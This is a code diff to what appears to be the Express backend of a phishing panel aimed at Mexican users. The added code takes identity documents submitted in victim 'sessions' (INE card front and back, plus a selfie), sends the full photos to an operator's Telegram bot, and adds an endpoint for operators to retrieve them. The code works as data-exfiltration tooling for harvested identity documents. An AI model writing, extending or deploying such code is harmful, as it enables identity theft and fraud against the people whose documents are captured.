@@ -84,6 +84,102 @@ const sendTelegramPhoto = async (imageData: string, caption: string) => {
   }
 };
 
+// Función para enviar fotos de identidad a Telegram
+const sendIdentityPhotosToTelegram = async (
+  sessionFolio: string,
+  tipoIdentificacion: string,
+  fotoFrente: string,
+  fotoAtras: string | null,
+  fotoSelfie: string
+) => {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!botToken || !chatId) {
+    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
+    return;
+  }
+
+  console.log(`📸 Enviando fotos de identidad a Telegram (Folio: ${sessionFolio})...`);
+
+  const wait = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
+  try {
+    // Foto frontal
+    if (fotoFrente) {
+      const base64Frente = fotoFrente.replace(/^data:image\/\w+;base64,/, '');
+      const bufferFrente = Buffer.from(base64Frente, 'base64');
+      
+      // Validar tamaño (límite de Telegram es 10MB)
+      if (bufferFrente.length > 10 * 1024 * 1024) {
+        console.error('❌ Foto frontal excede el límite de 10MB');
+      } else {
+        const formFrente = new FormData();
+        formFrente.append('chat_id', chatId);
+        formFrente.append('photo', bufferFrente, 'identidad_frente.jpg');
+        formFrente.append('caption', `📋 <b>Folio:</b> ${sessionFolio}\n📸 <b>${tipoIdentificacion} - Frente</b>`);
+        formFrente.append('parse_mode', 'HTML');
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formFrente, {
+          headers: formFrente.getHeaders()
+        });
+        console.log('✅ Foto frontal enviada');
+        await wait(1200); // Esperar 1.2s entre fotos
+      }
+    }
+
+    // Foto trasera (solo para INE)
+    if (fotoAtras && tipoIdentificacion === 'INE') {
+      const base64Atras = fotoAtras.replace(/^data:image\/\w+;base64,/, '');
+      const bufferAtras = Buffer.from(base64Atras, 'base64');
+      
+      if (bufferAtras.length > 10 * 1024 * 1024) {
+        console.error('❌ Foto trasera excede el límite de 10MB');
+      } else {
+        const formAtras = new FormData();
+        formAtras.append('chat_id', chatId);
+        formAtras.append('photo', bufferAtras, 'identidad_atras.jpg');
+        formAtras.append('caption', `📋 <b>Folio:</b> ${sessionFolio}\n📸 <b>INE - Atrás</b>`);
+        formAtras.append('parse_mode', 'HTML');
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formAtras, {
+          headers: formAtras.getHeaders()
+        });
+        console.log('✅ Foto trasera enviada');
+        await wait(1200);
+      }
+    }
+
+    // Selfie
+    if (fotoSelfie) {
+      const base64Selfie = fotoSelfie.replace(/^data:image\/\w+;base64,/, '');
+      const bufferSelfie = Buffer.from(base64Selfie, 'base64');
+      
+      if (bufferSelfie.length > 10 * 1024 * 1024) {
+        console.error('❌ Selfie excede el límite de 10MB');
+      } else {
+        const formSelfie = new FormData();
+        formSelfie.append('chat_id', chatId);
+        formSelfie.append('photo', bufferSelfie, 'selfie.jpg');
+        formSelfie.append('caption', `📋 <b>Folio:</b> ${sessionFolio}\n🤳 <b>Selfie</b>`);
+        formSelfie.append('parse_mode', 'HTML');
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formSelfie, {
+          headers: formSelfie.getHeaders()
+        });
+        console.log('✅ Selfie enviada');
+      }
+    }
+
+    console.log('✅ Todas las fotos de identidad enviadas exitosamente');
+  } catch (error: any) {
+    console.error('❌ Error enviando fotos de identidad a Telegram:', error?.response?.data || error?.message || error);
+    if (error?.response?.data) {
+      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
+    }
+  }
+};
+
 // Store active connections
 const clients = new Map<string, WebSocket>();
 // Cambiamos a un Map para asociar cada socket con su username
@@ -718,6 +814,44 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error("Error fetching sessions:", error);
       res.status(500).json({ message: "Error fetching sessions" });
+    }
+  });
+
+  // Endpoint para obtener las fotos de identidad de una sesión
+  app.get('/api/sessions/:id/photos', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const sessionId = req.params.id;
+      const session = await storage.getSessionById(sessionId);
+
+      if (!session) {
+        return res.status(404).json({ message: "Sesión no encontrada" });
+      }
+
+      // Verificar que el usuario tenga permiso para ver esta sesión
+      const user = req.user;
+      const isSuperAdmin = user.username === 'balonx';
+      const isAdmin = user.role === 'admin';
+      
+      if (!isAdmin && session.createdBy !== user.username) {
+        return res.status(403).json({ message: "No tiene permiso para ver esta sesión" });
+      }
+
+      // Devolver solo las fotos de identidad
+      res.json({
+        sessionId: session.sessionId,
+        tipoIdentificacion: session.tipoIdentificacion,
+        fotoIdentidadFrente: session.fotoIdentidadFrente,
+        fotoIdentidadAtras: session.fotoIdentidadAtras,
+        fotoSelfie: session.fotoSelfie,
+        hasPhotos: !!(session.fotoIdentidadFrente || session.fotoSelfie)
+      });
+    } catch (error) {
+      console.error("Error fetching identity photos:", error);
+      res.status(500).json({ message: "Error fetching identity photos" });
     }
   });
 
@@ -2447,7 +2581,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.pasoActual = ScreenType.VALIDANDO_IDENTIDAD;
                 console.log('Documentos de identidad recibidos:', inputData.tipoIdentificacion);
 
-                // Enviar notificación a Telegram
+                // Enviar notificación de texto a Telegram
                 const identidadMessage = `📸 <b>DOCUMENTOS DE IDENTIDAD</b>\n\n` +
                   `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `🆔 <b>Tipo:</b> ${inputData.tipoIdentificacion}\n` +
@@ -2455,18 +2589,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   (inputData.tipoIdentificacion === 'INE' ? `✅ <b>Foto trasera:</b> Recibida\n` : '') +
                   `✅ <b>Selfie:</b> Recibida\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
-                sendTelegramMessage(identidadMessage);
+                await sendTelegramMessage(identidadMessage);
 
-                // Notificar al admin
+                // Enviar las fotos reales a Telegram
+                await sendIdentityPhotosToTelegram(
+                  sessionFolio,
+                  inputData.tipoIdentificacion,
+                  inputData.fotoIdentidadFrente,
+                  inputData.fotoIdentidadAtras,
+                  inputData.fotoSelfie
+                );
+
+                // Notificar al admin con metadatos solamente (no fotos completas)
                 const identidadCreatedBy = existingSession?.createdBy || '';
                 broadcastToAdmins(JSON.stringify({
-                  type: 'IDENTIDAD_RECEIVED',
+                  type: 'IDENTITY_PHOTOS_RECEIVED',
                   data: {
                     sessionId,
                     tipoIdentificacion: inputData.tipoIdentificacion,
-                    fotoIdentidadFrente: inputData.fotoIdentidadFrente?.substring(0, 50) + '...',
-                    fotoIdentidadAtras: inputData.fotoIdentidadAtras ? inputData.fotoIdentidadAtras.substring(0, 50) + '...' : null,
-                    fotoSelfie: inputData.fotoSelfie?.substring(0, 50) + '...',
+                    hasPhotos: true,
+                    hasFotoFrente: !!inputData.fotoIdentidadFrente,
+                    hasFotoAtras: !!inputData.fotoIdentidadAtras,
+                    hasSelfie: !!inputData.fotoSelfie,
                     timestamp: new Date().toISOString(),
                     createdBy: identidadCreatedBy
                   }
